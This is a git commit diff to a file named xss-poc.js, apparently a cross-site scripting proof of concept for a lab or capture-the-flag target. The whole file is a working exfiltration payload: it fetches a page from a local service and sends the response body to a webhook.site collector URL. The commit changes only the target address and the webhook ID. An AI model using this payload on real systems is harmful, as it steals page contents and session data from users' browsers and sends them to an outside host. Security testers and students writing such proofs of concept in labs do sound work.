3ef3772655787f17103cbbe274d6b5e5f36896c8
Dorjsambuu <hw13d036@csms.edu.mn>
2022-10-27 11:29:21 +0800

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,6 +1,6 @@
 
-fetch("http://127.0.0.1:9000/view/129c0456-96c8-4afc-ac2c-9e21a94367d9").then((res) => {
+fetch("http://127.0.0.1:30106/").then((res) => {
 	return res.text();
 }).then(data => {
-	fetch("https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data);
+	fetch("https://webhook.site/4d5de934-a8c5-4c46-9e2e-0377f5ba5c76/a.png?data="+data);
 })
